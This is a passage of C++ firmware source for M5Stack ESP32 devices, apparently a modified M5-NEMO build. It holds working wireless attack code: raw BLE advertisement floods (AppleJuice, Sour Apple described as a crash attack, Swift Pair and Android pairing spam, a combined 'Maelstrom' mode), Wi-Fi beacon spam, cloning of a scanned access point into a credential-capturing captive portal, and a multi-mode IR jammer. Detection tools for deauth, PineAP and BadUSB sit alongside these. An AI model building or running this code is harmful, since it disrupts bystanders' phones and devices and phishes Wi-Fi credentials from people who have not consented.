  if (check_next_press()) { cursor++; cursor = cursor % btmenu_size; drawmenu(btmenu, btmenu_size); delay(250); }
  if (check_select_press()) {
    int option = btmenu[cursor].command;
    DISP.fillScreen(BGCOLOR); DISP.setTextSize(MEDIUM_TEXT); DISP.setCursor(0, 0);
    DISP.setTextColor(BGCOLOR, FGCOLOR); DISP.printf(" %-12s\n", TXT_BT_SPAM);
    DISP.setTextColor(FGCOLOR, BGCOLOR); DISP.setTextSize(SMALL_TEXT);
    switch(option) {
      case 0: DISP.fillScreen(BGCOLOR); rstOverride = false; isSwitching = true; current_proc = 8; break;
      case 1: swiftPair = true; current_proc = 9; rstOverride = false; isSwitching = true; DISP.print(TXT_SP_RND); DISP.print(TXT_SEL_EXIT2); break;
      case 2: sourApple = true; current_proc = 9; rstOverride = false; isSwitching = true; DISP.print(TXT_SA_CRASH); DISP.print(TXT_SEL_EXIT2); break;
      case 3: rstOverride = false; isSwitching = true; current_proc = 17; DISP.print("Bluetooth Maelstrom\n"); DISP.print(TXT_CMB_BT_SPAM); DISP.print(TXT_SEL_EXIT2); break;
      case 4: androidPair = true; current_proc = 9; rstOverride = false; isSwitching = true; DISP.print(TXT_AD_SPAM); DISP.print(TXT_SEL_EXIT2); break;
      case 5: DISP.fillScreen(BGCOLOR); rstOverride = false; isSwitching = true; current_proc = 1; break;
      case 25: rstOverride = false; isSwitching = true; current_proc = 25; break;
    }
  }
}

MENU ajmenu[] = {
  { TXT_BACK, 30},{ "AirPods", 1},{ TXT_AJ_TRANSF_NM, 27},{ "AirPods Pro", 2},{ "AirPods Max", 3},
  { "AirPods G2", 4},{ "AirPods G3", 5},{ "AirPods Pro G2", 6},{ "PowerBeats", 7},{ "PowerBeats Pro", 8},
  { "Beats Solo Pro", 9},{ "Beats Studio Buds", 10},{ "Beats Flex", 11},{ "Beats X", 12},
  { "Beats Solo 3", 13},{ "Beats Studio 3", 14},{ "Beats Studio Pro", 15},{ "Beats Fit Pro", 16},
  { "Beats Studio Buds+", 17},{ "Apple Vision Pro", 29},{ "AppleTV Setup", 18},{ "AppleTV Pair", 19},
  { "AppleTV New User", 20},{ "AppleTV AppleID", 21},{ "AppleTV Audio", 22},{ "AppleTV HomeKit", 23},
  { "AppleTV Keyboard", 24},{ "AppleTV Network", 25},{ TXT_AJ_TV_COLOR, 26},{ TXT_STP_NW_PH, 28},
};
int ajmenu_size = sizeof(ajmenu) / sizeof (MENU);

void aj_setup(){
  DISP.fillScreen(BGCOLOR); DISP.setTextSize(MEDIUM_TEXT); DISP.setCursor(0, 0);
  DISP.setTextColor(BGCOLOR, FGCOLOR); DISP.println(" AppleJuice  ");
  DISP.setTextColor(FGCOLOR, BGCOLOR); delay(1000);
  cursor = 0; sourApple = false; swiftPair = false; maelstrom = false;
  rstOverride = true; drawmenu(ajmenu, ajmenu_size);
}

void aj_loop(){
  if (!maelstrom){
    if (check_next_press()) { cursor++; cursor = cursor % ajmenu_size; drawmenu(ajmenu, ajmenu_size); delay(100); }
  }
  if (check_select_press() || maelstrom) {
    deviceType = ajmenu[cursor].command;
    if (maelstrom) deviceType = random(1, 28);
    switch(deviceType) {
      case 1: data = Airpods; break;
      case 2: data = AirpodsPro; break;
      case 3: data = AirpodsMax; break;
      case 4: data = AirpodsGen2; break;
      case 5: data = AirpodsGen3; break;
      case 6: data = AirpodsProGen2; break;
      case 7: data = PowerBeats; break;
      case 8: data = PowerBeatsPro; break;
      case 9: data = BeatsSoloPro; break;
      case 10: data = BeatsStudioBuds; break;
      case 11: data = BeatsFlex; break;
      case 12: data = BeatsX; break;
      case 13: data = BeatsSolo3; break;
      case 14: data = BeatsStudio3; break;
      case 15: data = BeatsStudioPro; break;
      case 16: data = BeatsFitPro; break;
      case 17: data = BeatsStudioBudsPlus; break;
      case 18: data = AppleTVSetup; break;
      case 19: data = AppleTVPair; break;
      case 20: data = AppleTVNewUser; break;
      case 21: data = AppleTVAppleIDSetup; break;
      case 22: data = AppleTVWirelessAudioSync; break;
      case 23: data = AppleTVHomekitSetup; break;
      case 24: data = AppleTVKeyboard; break;
      case 25: data = AppleTVConnectingToNetwork; break;
      case 26: data = TVColorBalance; break;
      case 27: data = TransferNumber; break;
      case 28: data = SetupNewPhone; break;
      case 29: data = AppleVisionPro; break;
      case 30: rstOverride = false; isSwitching = true; current_proc = 1; break;
    }
    if (current_proc == 8 && isSwitching == false){
      DISP.fillScreen(BGCOLOR); DISP.setTextSize(MEDIUM_TEXT); DISP.setCursor(0, 0);
      DISP.setTextColor(BGCOLOR, FGCOLOR); DISP.println(" AppleJuice  ");
      DISP.setTextColor(FGCOLOR, BGCOLOR); DISP.setTextSize(SMALL_TEXT);
      DISP.print(TXT_ADV); DISP.print(ajmenu[cursor].name); DISP.print(TXT_SEL_EXIT2);
      isSwitching = true; current_proc = 9;
    }
  }
}

void aj_adv_setup(){ rstOverride = false; }

void aj_adv(){
  rstOverride = true;
  if (sourApple || swiftPair || androidPair || maelstrom){ delay(20); advtime = 0; }
  if (millis() > advtime + ajDelay){
    advtime = millis();
    pAdvertising->stop();
    BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();
    if (sourApple){
      uint8_t packet[17]; uint8_t size = 17; uint8_t i = 0;
      packet[i++] = size - 1; packet[i++] = 0xFF; packet[i++] = 0x4C; packet[i++] = 0x00;
      packet[i++] = 0x0F; packet[i++] = 0x05; packet[i++] = 0xC1;
      const uint8_t types[] = { 0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0 };
      packet[i++] = types[rand() % sizeof(types)];
      esp_fill_random(&packet[i], 3); i += 3;
      packet[i++] = 0x00; packet[i++] = 0x00; packet[i++] = 0x10;
      esp_fill_random(&packet[i], 3);
      oAdvertisementData.addData(String((char *)packet, 17));
    } else if (swiftPair) {
      const char* display_name = generateRandomName();
      uint8_t display_name_len = strlen(display_name);
      uint8_t size = 7 + display_name_len;
      uint8_t* packet = (uint8_t*)malloc(size);
      if (!packet) { free((void*)display_name); return; }
      uint8_t i = 0;
      packet[i++] = size - 1; packet[i++] = 0xFF; packet[i++] = 0x06; packet[i++] = 0x00;
      packet[i++] = 0x03; packet[i++] = 0x00; packet[i++] = 0x80;
      for (int j = 0; j < display_name_len; j++) packet[i + j] = display_name[j];
      oAdvertisementData.addData(String((char *)packet, size));
      free(packet); free((void*)display_name);
    } else if (androidPair) {
      uint8_t packet[14]; uint8_t i = 0;
      packet[i++] = 3; packet[i++] = 0x03; packet[i++] = 0x2C; packet[i++] = 0xFE;
      packet[i++] = 6; packet[i++] = 0x16; packet[i++] = 0x2C; packet[i++] = 0xFE;
      const uint32_t model = android_models[rand() % android_models_count].value;
      packet[i++] = (model >> 0x10) & 0xFF;
      packet[i++] = (model >> 0x08) & 0xFF;
      packet[i++] = (model >> 0x00) & 0xFF;
      packet[i++] = 2; packet[i++] = 0x0A; packet[i++] = (rand() % 120) - 100;
      oAdvertisementData.addData(String((char *)packet, 14));
    } else {
      if (deviceType >= 18) oAdvertisementData.addData(String((char*)data, sizeof(AppleTVPair)));
      else oAdvertisementData.addData(String((char*)data, sizeof(Airpods)));
    }
    pAdvertising->setAdvertisementData(oAdvertisementData);
    pAdvertising->start();
#if defined(M5LED)
    digitalWrite(M5LED, M5LED_ON); delay(10); digitalWrite(M5LED, M5LED_OFF);
#endif
  }
  if (check_next_press()) {
    if (sourApple || swiftPair || androidPair || maelstrom){
      isSwitching = true; current_proc = 16; drawmenu(btmenu, btmenu_size);
    } else {
      isSwitching = true; current_proc = 8; drawmenu(ajmenu, ajmenu_size);
    }
    sourApple = false; swiftPair = false; maelstrom = false;
    pAdvertising->stop(); delay(250);
  }
}

void credits_setup(){
  DISP.fillScreen(WHITE); DISP.qrcode("https://github.com/n0xa/m5stick-nemo", 145, 22, 100, 5);
  DISP.setTextColor(BLACK, WHITE); DISP.setTextSize(MEDIUM_TEXT); DISP.setCursor(0, 10);
  DISP.print(" M5-NEMO\n"); DISP.setTextSize(SMALL_TEXT);
  DISP.printf("  %s\n",NEMO_VERSION); DISP.println(" For M5Stack");
  DISP.printf(" %s\n\n", platformName); DISP.println("Contributors:");
  DISP.setCursor(155, 5); DISP.println("GitHub");
  DISP.setCursor(155, 17); DISP.println("Source:");
  delay(250); cursor = 0; advtime = 0;
}

void credits_loop(){
  if(millis() > advtime){
    DISP.setTextColor(BLACK, WHITE);
    DISP.setCursor(0, 115); DISP.println("                   ");
    DISP.setCursor(0, 115); DISP.println(contributors[cursor]);
    cursor++; cursor = cursor % (sizeof(contributors)/sizeof(contributors[0]));
    DISP.setTextColor(FGCOLOR, BGCOLOR); advtime=millis() + 2000;
  }
}

void wifispam_setup() {
  for (int i = 0; i < 32; i++) emptySSID[i] = ' ';
  randomSeed(1);
  packetSize = sizeof(beaconPacket);
  if (wpa2) { beaconPacket[34] = 0x31; } else { beaconPacket[34] = 0x21; packetSize -= 26; }
  WiFi.mode(WIFI_MODE_STA);
  esp_wifi_set_channel(channels[0], WIFI_SECOND_CHAN_NONE);
  DISP.fillScreen(BGCOLOR); DISP.setTextSize(BIG_TEXT); DISP.setCursor(0, 0);
  DISP.println(TXT_WF_SP); delay(1000);
  DISP.setTextSize(TINY_TEXT); DISP.fillScreen(BGCOLOR); DISP.setCursor(0, 0);
  DISP.print(TXT_WF_SP);
  int ct = 0; const char *str;
  switch(spamtype) {
    case 1: for(str = funnyssids; *str; ++str) ct += *str == '\n'; DISP.printf(" - %d SSIDs:\n", ct); DISP.print(funnyssids); break;
    case 2: for(str = rickrollssids; *str; ++str) ct += *str == '\n'; DISP.printf(" - %d SSIDs:\n", ct); DISP.print(rickrollssids); break;
    case 3: DISP.printf(TXT_RND_SSID, ct); break;
  }
  DISP.setTextSize(SMALL_TEXT); current_proc = 11;
}

void wifispam_loop() {
  int i = 0; int len = 0;
#if defined(M5LED)
  digitalWrite(M5LED, M5LED_ON); delay(1); digitalWrite(M5LED, M5LED_OFF);
#endif
  switch(spamtype) {
    case 1: len = sizeof(funnyssids); while(i < len){ i++; } beaconSpamList(funnyssids); break;
    case 2: len = sizeof(rickrollssids); while(i < len){ i++; } beaconSpamList(rickrollssids); break;
    case 3: { char* randoms = randomSSID(); len = sizeof(randoms); while(i < len){ i++; } beaconSpamList(randoms); } break;
  }
}

void btmaelstrom_setup(){ rstOverride = false; maelstrom = true; }

void btmaelstrom_loop(){
  swiftPair = false; sourApple = true; aj_adv();
  if (maelstrom){ swiftPair = true; androidPair = false; sourApple = false; aj_adv(); }
  if (maelstrom){ swiftPair = false; androidPair = true; sourApple = false; aj_adv(); }
  if (maelstrom){ swiftPair = false; androidPair = false; sourApple = false; aj_loop(); aj_adv(); }
}

MENU wsmenu[] = {
  { TXT_BACK, 5},{ TXT_WF_SCAN, 0},{ TXT_WF_SPAM_FUN, 1},{ TXT_WF_SPAM_RR, 2},
  { TXT_WF_SPAM_RND, 3},{ "NEMO Portal", 4},{ "Deauth Hunter", 24},{ TXT_PINEAP_HUNTER, 26},
};
int wsmenu_size = sizeof(wsmenu) / sizeof (MENU);

void wsmenu_setup() { cursor = 0; rstOverride = true; drawmenu(wsmenu, wsmenu_size); delay(500); }

void wsmenu_loop() {
  if (check_next_press()) { cursor++; cursor = cursor % wsmenu_size; drawmenu(wsmenu, wsmenu_size); delay(250); }
  if (check_select_press()) {
    int option = wsmenu[cursor].command;
    rstOverride = false; current_proc = 11; isSwitching = true;
    switch(option) {
      case 0: rstOverride = false; isSwitching = true; current_proc = 14; break;
      case 1: spamtype = 1; break;
      case 2: spamtype = 2; break;
      case 3: spamtype = 3; break;
      case 4: current_proc = 19; break;
      case 5: current_proc = 1; break;
      case 24: current_proc = 24; break;
      case 26: current_proc = 26; break;
    }
  }
}

void wscan_drawmenu() {
  char ssid[19];
  DISP.setTextSize(SMALL_TEXT); DISP.fillScreen(BGCOLOR); DISP.setCursor(0, 0);
  if (cursor > 4) {
    for (int i = 0 + (cursor - 4); i < wifict; i++) {
      if(cursor == i) DISP.setTextColor(BGCOLOR, FGCOLOR);
      DISP.print(" "); DISP.println(WiFi.SSID(i).substring(0,19));
      DISP.setTextColor(FGCOLOR, BGCOLOR);
    }
  } else {
    for (int i = 0; i < wifict; i++) {
      if(cursor == i) DISP.setTextColor(BGCOLOR, FGCOLOR);
      DISP.print(" "); DISP.println(WiFi.SSID(i).substring(0,19));
      DISP.setTextColor(FGCOLOR, BGCOLOR);
    }
  }
  if(cursor == wifict) DISP.setTextColor(BGCOLOR, FGCOLOR);
  DISP.println(TXT_WF_RESCAN); DISP.setTextColor(FGCOLOR, BGCOLOR);
  if(cursor == wifict + 1) DISP.setTextColor(BGCOLOR, FGCOLOR);
  DISP.println(String(TXT_BACK)); DISP.setTextColor(FGCOLOR, BGCOLOR);
}

void wscan_result_setup() { cursor = 0; rstOverride = true; wscan_drawmenu(); delay(500); }

void wscan_result_loop(){
  if (check_next_press()) { cursor++; cursor = cursor % ( wifict + 2); wscan_drawmenu(); delay(250); }
  if (check_select_press()) {
    delay(250);
    if(cursor == wifict){ rstOverride = false; current_proc = 14; }
    if(cursor == wifict + 1){ rstOverride = false; isSwitching = true; current_proc = 12; }
    String encryptType = "";
    switch (WiFi.encryptionType(cursor)) {
    case 1: encryptType = "WEP"; break;
    case 2: encryptType = "WPA/PSK/TKIP"; break;
    case 3: encryptType = "WPA/PSK/CCMP"; break;
    case 4: encryptType = "WPA2/PSK/Mixed/CCMP"; break;
    case 8: encryptType = "WPA/WPA2/PSK"; break;
    case 0: encryptType = TXT_WF_OPEN; break;
    }
    DISP.fillScreen(BGCOLOR); DISP.setCursor(0, 0);
    DISP.setTextColor(BGCOLOR, FGCOLOR);
    if(WiFi.SSID(cursor).length() > 12) DISP.setTextSize(SMALL_TEXT);
    else if(WiFi.SSID(cursor).length() > 20) DISP.setTextSize(TINY_TEXT);
    else DISP.setTextSize(MEDIUM_TEXT);
    DISP.println(WiFi.SSID(cursor));
    DISP.setTextColor(FGCOLOR, BGCOLOR); DISP.setTextSize(SMALL_TEXT);
    DISP.printf(TXT_WF_CHANN, WiFi.channel(cursor));
    DISP.printf(TXT_WF_CRYPT, encryptType);
    DISP.print("BSSID:\n" + WiFi.BSSIDstr(i));
    DISP.printf(TXT_SEL_BACK);
    DISP.setTextColor(BGCOLOR, FGCOLOR);
    DISP.printf(" %-19s\n", TXT_HOLD_CLONE);
    DISP.setTextColor(FGCOLOR, BGCOLOR);
   if(check_select_press()){
      apMac=WiFi.BSSIDstr(cursor); apSsidName=WiFi.SSID(cursor);
      channel = static_cast<uint8_t>(WiFi.channel(cursor));
      clone_flg = true; rstOverride = false; current_proc = 19; isSwitching = true; delay(100);
    }
  }
}

void wscan_setup(){
  rstOverride = false; cursor = 0;
  DISP.fillScreen(BGCOLOR); DISP.setTextSize(BIG_TEXT); DISP.setCursor(0, 0);
  DISP.println(TXT_WF_SCN); delay(2000);
}

void wscan_loop(){
  DISP.fillScreen(BGCOLOR); DISP.setTextSize(MEDIUM_TEXT); DISP.setCursor(0, 0);
  DISP.println(TXT_WF_SCNING);
  wifict = WiFi.scanNetworks();
  DISP.fillScreen(BGCOLOR); DISP.setTextSize(SMALL_TEXT); DISP.setCursor(0, 0);
  if(wifict > 0){ isSwitching = true; current_proc=15; }
}

void bootScreen(){
  #ifdef SONG
  setupSongs();
  #endif
  #if !defined(STICK_C)
  BITMAP; delay(3000);
  #endif
  DISP.fillScreen(BGCOLOR); DISP.setTextSize(BIG_TEXT); DISP.setCursor(40, 0);
  DISP.println("M5-NEMO"); DISP.setCursor(10, 30);
  DISP.setTextSize(SMALL_TEXT); DISP.printf("%s-%s\n",NEMO_VERSION,platformName);
#if defined(CARDPUTER)
  DISP.println(TXT_INST_NXT); DISP.println(TXT_INST_PRV);
  DISP.println(TXT_INST_SEL); DISP.println(TXT_INST_HOME);
  delay(1500); DISP.println(TXT_INST_PRSS_KEY);
  while(true){
    M5Cardputer.update();
    if (M5Cardputer.Keyboard.isChange()) { drawmenu(mmenu, mmenu_size); delay(250); break; }
  }
#else
  DISP.println(TXT_STK_NXT); DISP.println(TXT_STK_SEL);
#if !defined(STICKS3)
  DISP.println(TXT_STK_HOME);
#endif
  delay(3000);
#endif
}

void qrmenu_drawmenu() {
  DISP.setTextSize(SMALL_TEXT); DISP.fillScreen(BGCOLOR); DISP.setCursor(0, 8, 1);
  for (int i = 0; i < ( sizeof(qrcodes) / sizeof(QRCODE) ); i++) {
    DISP.print((cursor == i) ? ">" : " "); DISP.println(qrcodes[i].name);
  }
}

void qrmenu_setup() { cursor = 0; rstOverride = true; qrmenu_drawmenu(); delay(500); }

void qrmenu_loop() {
  if (check_next_press()) {
    cursor++; cursor = cursor % ( sizeof(qrcodes) / sizeof(QRCODE) );
    qrmenu_drawmenu(); activeQR = false; delay(250);
  }
  if (check_select_press()) {
    if (qrcodes[cursor].url.length() < 1){ current_proc = 1; isSwitching = true; }
    else if ( activeQR == false ) {
      activeQR = true; DISP.fillScreen(WHITE);
      DISP.qrcode(qrcodes[cursor].url, (DISP.width() - DISP.height()) / 2, 0, DISP.height(), 5);
      delay(500);
    } else { isSwitching = true; activeQR = false; delay(250); }
  }
}

void portal_setup(){
  setupWiFi(); setupWebServer(); portal_active = true; cursor = 0; rstOverride = true;
  printHomeToScreen(); delay(500);
}

void portal_loop(){
  if ((millis() - lastTick) > PortalTickTimer) {
    lastTick = millis();
    if (totalCapturedCredentials != previousTotalCapturedCredentials) {
      previousTotalCapturedCredentials = totalCapturedCredentials; printHomeToScreen();
    }
  }
  dnsServer.processNextRequest(); webServer.handleClient();
  if (check_next_press()){
    shutdownWebServer(); portal_active = false; clone_flg = false;
    current_proc = 12; delay(500);
  }
  check_select_press();
}

void setup() {
Serial.begin(115200);
#if defined(CARDPUTER)
  auto cfg = M5.config();
  M5Cardputer.begin(cfg, true);
#else
  M5.begin();
#endif
#if defined(BACKLIGHT)
  pinMode(BACKLIGHT, OUTPUT);
#endif
  if(check_next_press()) clearSettings();
  #if defined(USE_EEPROM)
    EEPROM.begin(EEPROM_SIZE);
    if(EEPROM.read(0) > 3 || EEPROM.read(1) > 240 || EEPROM.read(2) > 100 || EEPROM.read(3) > 1 || EEPROM.read(4) > 19 || EEPROM.read(5) > 19 || EEPROM.read(6) > 100 || EEPROM.read(8) > 100 || EEPROM.read(9) > 100 || EEPROM.read(10) > 100 ) {
      #if defined(CARDPUTER)
      EEPROM.write(0, 1);
      #else
      EEPROM.write(0, 3);
      #endif
      EEPROM.write(1, 15); EEPROM.write(2, 100); EEPROM.write(3, 0);
      EEPROM.write(4, 11); EEPROM.write(5, 1); EEPROM.write(6, 40);
      EEPROM.write(7, 50); EEPROM.write(8, 20); EEPROM.write(9, 50); EEPROM.write(10, 5);
      EEPROM.commit();
    }
    rotation = EEPROM.read(0); screen_dim_time = EEPROM.read(1);
    brightness = EEPROM.read(2); region = EEPROM.read(3);
    setcolor(true, EEPROM.read(4)); setcolor(false, EEPROM.read(5));
    bh_max_rssi = -(EEPROM.read(6)); bh_pkts = EEPROM.read(7);
    dh_max_rssi = -(EEPROM.read(8)); dh_pkts = EEPROM.read(9);
  #endif
  getSSID();
#if defined(M5LED)
  pinMode(M5LED, OUTPUT); digitalWrite(M5LED, M5LED_OFF);
#endif
#if defined(IRLED)
  pinMode(IRLED, OUTPUT); digitalWrite(IRLED, M5LED_OFF);
#endif
#if !defined(KB)
  pinMode(M5_BUTTON_HOME, INPUT); pinMode(M5_BUTTON_RST, INPUT);
#endif
#if defined(M5_BUTTON_MENU)
  pinMode(M5_BUTTON_MENU, INPUT);
#endif
  randomSeed(analogRead(0));
  BLEDevice::init("");
  BLEServer *pServer = BLEDevice::createServer();
  pAdvertising = pServer->getAdvertising();
  BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();
  setupSdCard();
  bootTime = lastActivity = millis();
  screenBrightness(brightness); dimtimer();
  DISP.setRotation(rotation); DISP.setTextColor(FGCOLOR, BGCOLOR);
  bootScreen();
}

void menu_controller_loop() { menuController.loop(); }

// ============================================================
// SD FILE BROWSER (Cardputer only)
// ============================================================
#if defined(CARDPUTER)
  #define MAX_SD_FILES 100
  #define SD_NAME_MAX  13

  String   sdFileNames[MAX_SD_FILES];
  uint32_t sdFileSizes[MAX_SD_FILES];
  bool     sdFileIsDir[MAX_SD_FILES];
  int      sdFileCount = 0;

  void sdmenu_draw() {
    DISP.setTextSize(SMALL_TEXT); DISP.fillScreen(BGCOLOR);
    DISP.setCursor(0, 0); DISP.setTextColor(FGCOLOR, BGCOLOR);
    if (sdFileCount == 0) { DISP.println("SD empty / not mounted"); DISP.println("Sel: Back"); return; }
    int start = 0;
    if (cursor > 5) start = cursor - 5;
    for (int i = start; i < sdFileCount; i++) {
      if (cursor == i) DISP.setTextColor(BGCOLOR, FGCOLOR);
      String n = sdFileNames[i];
      if (n.length() > SD_NAME_MAX) n = n.substring(0, SD_NAME_MAX);
      DISP.printf(" %-13s", n.c_str());
      if (sdFileIsDir[i]) { DISP.println("  DIR"); }
      else { DISP.printf("%4dK\n", sdFileSizes[i] / 1024); }
      DISP.setTextColor(FGCOLOR, BGCOLOR);
    }
  }

  void sdmenu_setup() {
    cursor = 0; sdFileCount = 0;
    File root = SD.open("/");
    if (!root) {
      DISP.fillScreen(BGCOLOR); DISP.setCursor(0, 0);
      DISP.println("SD open failed"); delay(1500);
      rstOverride = false; isSwitching = true; current_proc = 1; return;
    }
    File entry = root.openNextFile();
    while (entry && sdFileCount < MAX_SD_FILES) {
      String n = entry.name();
      if (n.startsWith("/")) n = n.substring(1);
      sdFileNames[sdFileCount]  = n;
      sdFileSizes[sdFileCount]  = entry.size();
      sdFileIsDir[sdFileCount]  = entry.isDirectory();
      sdFileCount++;
      entry.close(); entry = root.openNextFile();
    }
    root.close();
    rstOverride = true; sdmenu_draw(); delay(500);
  }

  void sdmenu_loop() {
    if (check_next_press()) {
      if (sdFileCount > 0) { cursor++; cursor = cursor % sdFileCount; sdmenu_draw(); }
      delay(250);
    }
    if (check_select_press()) {
      rstOverride = false; isSwitching = true; current_proc = 1; delay(250);
    }
  }
#endif

// ============================================================
// IR JAMMER (портировано из Bruce)
// ============================================================
#define IRJAM_NUM_FREQS 7
static const uint16_t IRJAM_FREQS[IRJAM_NUM_FREQS] = {30000, 33000, 36000, 38000, 40000, 42000, 56000};
static const char* IRJAM_MODE_NAMES[5] = {"BASIC", "ENH.BASIC", "SWEEP", "RANDOM", "EMPTY"};

struct IRJammerState {
    uint8_t  mode;              // 0=BASIC 1=ENH 2=SWEEP 3=RANDOM 4=EMPTY
    uint8_t  jamDensity;        // 1..20
    uint16_t markTiming;
    uint16_t spaceTiming;
    uint16_t minTiming;
    uint16_t maxTiming;
    uint8_t  sweepSpeed;
    int8_t   sweepDirection;
    uint8_t  freqIdx;           // 0..6
    uint32_t lastUpdate;
    uint32_t jamCount;
    bool     redraw;
};

static IRJammerState irjam = {};
static uint16_t irjam_freq() { return IRJAM_FREQS[irjam.freqIdx]; }

static void irjam_sendPat(const uint16_t* pat, uint16_t len) {
    IrSender.sendRaw((uint16_t*)pat, len, irjam_freq());
}

static void irjam_doBasic() {
    uint16_t pat[40];
    for (int i = 0; i < 40; i += 2) {
        pat[i]   = irjam.markTiming;
        pat[i+1] = irjam.markTiming;
    }
    for (int r = 0; r < irjam.jamDensity; r++) irjam_sendPat(pat, 40);
}

static void irjam_doEnhanced() {
    uint16_t pat[40];
    for (int i = 0; i < 40; i += 2) {
        pat[i]   = irjam.markTiming;
        pat[i+1] = irjam.spaceTiming;
    }
    for (int r = 0; r < irjam.jamDensity; r++) irjam_sendPat(pat, 40);
}

static void irjam_doSweep() {
    irjam.markTiming += irjam.sweepDirection * irjam.sweepSpeed;
    if (irjam.markTiming > irjam.maxTiming || irjam.markTiming < irjam.minTiming) {
        irjam.sweepDirection *= -1;
        irjam.markTiming = constrain(irjam.markTiming, irjam.minTiming, irjam.maxTiming);
    }
    irjam.spaceTiming = irjam.markTiming;
    uint16_t pat[60];
    for (int i = 0; i < 60; i += 2) {
        pat[i]   = irjam.markTiming;
        pat[i+1] = irjam.markTiming;
    }
    irjam_sendPat(pat, 60);
}

static void irjam_doRandom() {
    uint16_t pat[60];
    for (int i = 0; i < 60; i++) pat[i] = random(5, 1000);
    if (random(10) < 3) irjam.freqIdx = random(IRJAM_NUM_FREQS);
    irjam_sendPat(pat, 60);
}

static void irjam_doEmpty() {
    uint16_t pat[4] = {1, 1, 1, 1};
    for (int i = 0; i < irjam.jamDensity; i++) irjam_sendPat(pat, 4);
    if (random(5) < 2) irjam.freqIdx = (irjam.freqIdx + 1) % IRJAM_NUM_FREQS;
}

void irjam_draw() {
    DISP.fillScreen(BGCOLOR);
    DISP.setTextSize(SMALL_TEXT);
    DISP.setCursor(0, 0);
    
    DISP.setTextColor(BGCOLOR, FGCOLOR);
    DISP.println(" IR Jammer ");      // Шапка
    DISP.setTextColor(FGCOLOR, BGCOLOR);
    
    DISP.printf("Mode: %s   \n", IRJAM_MODE_NAMES[irjam.mode]);
    DISP.printf("Freq: %u kHz\n", irjam_freq() / 1000);
    DISP.printf("Jams: %lu   \n", (unsigned long)irjam.jamCount);
    DISP.printf("Tmg : %u us \n", irjam.markTiming);
    DISP.println("");
    DISP.println("ENT:Mode  TAB:Exit");
}

void irjam_setup() {
    irjam.mode           = 2;   // SWEEP по умолчанию
    irjam.jamDensity     = 5;
    irjam.markTiming     = 12;
    irjam.spaceTiming    = 12;
    irjam.minTiming      = 8;
    irjam.maxTiming      = 70;
    irjam.sweepSpeed     = 2;
    irjam.sweepDirection = 1;
    irjam.freqIdx        = 3;   // 38 kHz
    irjam.lastUpdate     = 0;
    irjam.jamCount       = 0;
    irjam.redraw         = true;

    IrSender.begin(IRLED);
    digitalWrite(IRLED, M5LED_OFF);

    rstOverride = true;
    irjam_draw();
    delay(500);
}

void irjam_loop() {
    if (check_next_press()) {
        digitalWrite(IRLED, M5LED_OFF);
        rstOverride = false;
        isSwitching = true;
        current_proc = 1;
        delay(250);
        return;
    }
    if (check_select_press()) {
        irjam.mode = (irjam.mode + 1) % 5;
        irjam.jamCount = 0;
        irjam.redraw = true;
        delay(300);
    }

    uint32_t now = millis();
    static uint32_t lastDisp = 0;
    if (irjam.redraw || now - lastDisp > 1000) {
        irjam.redraw = false;
        lastDisp = now;
        irjam_draw();
    }

    if (now - irjam.lastUpdate > 15) {
        irjam.lastUpdate = now;
        switch (irjam.mode) {
            case 0: irjam_doBasic();    break;
            case 1: irjam_doEnhanced(); break;
            case 2: irjam_doSweep();    break;
            case 3: irjam_doRandom();   break;
            case 4: irjam_doEmpty();    break;
        }
        irjam.jamCount++;
    }
}

struct ProcessHandler {
  int id;
  void (*setup_func)();
  void (*loop_func)();
  const char* name;
};

ProcessHandler processes[] = {
#if defined(RTC)
  {0, clock_setup, clock_loop, "Clock"},
#endif
  {1, mmenu_setup, menu_controller_loop, "Main Menu"},
  {2, smenu_setup, menu_controller_loop, "Settings Menu"},
#if defined(RTC)
  {3, timeset_setup, timeset_loop, "Time Settings"},
#endif
  {4, dmenu_setup, menu_controller_loop, "Display Menu"},
  {5, tvbgone_setup, tvbgone_loop, "TV-B-Gone"},
#if defined(AXP) || defined(PWRMGMT) || defined(CARDPUTER)
  {6, battery_setup, battery_loop, "Battery Info"},
#endif
#if defined(ROTATION)
  {7, rmenu_setup, menu_controller_loop, "Rotation Menu"},
#endif
  {8, aj_setup, aj_loop, "Apple Juice"},
  {9, aj_adv_setup, aj_adv, "Apple Juice Advanced"},
  {10, credits_setup, credits_loop, "Credits"},
  {11, wifispam_setup, wifispam_loop, "WiFi Spam"},
  {12, wsmenu_setup, wsmenu_loop, "WiFi Scanner Menu"},
  {13, tvbgmenu_setup, menu_controller_loop, "TV-B-Gone Menu"},
  {14, wscan_setup, wscan_loop, "WiFi Scan"},
  {15, wscan_result_setup, wscan_result_loop, "WiFi Scan Results"},
  {16, btmenu_setup, btmenu_loop, "Bluetooth Menu"},
  {17, btmaelstrom_setup, btmaelstrom_loop, "BLE Maelstrom"},
  {18, qrmenu_setup, qrmenu_loop, "QR Menu"},
  {19, portal_setup, portal_loop, "Captive Portal"},
  {22, color_setup, color_loop, "Color Settings"},
  {23, theme_setup, theme_loop, "Theme Settings"},
  {24, deauth_hunter_setup, deauth_hunter_loop, "Deauth Hunter"},
  {25, ble_hunter_setup, ble_hunter_loop, "BLE Hunter"},
  {26, pineap_hunter_setup, pineap_hunter_loop, "PineAP Hunter"},
#if defined(CARDPUTER)
  {27, badusb_hunter_setup, badusb_hunter_loop, "BadUSB Hunter"},
#endif
  {29, bh_rssi_setup, bh_rssi_loop, "BH RSSI Setting"},
  {30, dh_rssi_setup, dh_rssi_loop, "DH RSSI Setting"},
  {31, bh_alert_pkts_setup, bh_alert_pkts_loop, "BH Alert Pkts Setting"},
  {32, dh_alert_pkts_setup, dh_alert_pkts_loop, "DH Alert Pkts Setting"},
  {33, ph_alert_ssids_setup, ph_alert_ssids_loop, TXT_PH_ALERT_SSIDS},
#if defined(CARDPUTER)
  {34, sdmenu_setup, sdmenu_loop, "SD Card Browser"},
#endif
  {35, irjam_setup, irjam_loop, "IR Jammer"},
#if defined(SDCARD) && !defined(CARDPUTER)
  {97, nullptr, ToggleSDCard, "SD Card"},
#endif
  {-1, nullptr, nullptr, nullptr}
};

void runCurrentSetup() {
  for (int i = 0; processes[i].id != -1; i++) {
    if (processes[i].id == current_proc) {
      if (processes[i].setup_func) processes[i].setup_func();
      return;
    }
  }
}

void runCurrentLoop() {
  for (int i = 0; processes[i].id != -1; i++) {
    if (processes[i].id == current_proc) {
      if (processes[i].loop_func) processes[i].loop_func();
      return;
    }
  }
}

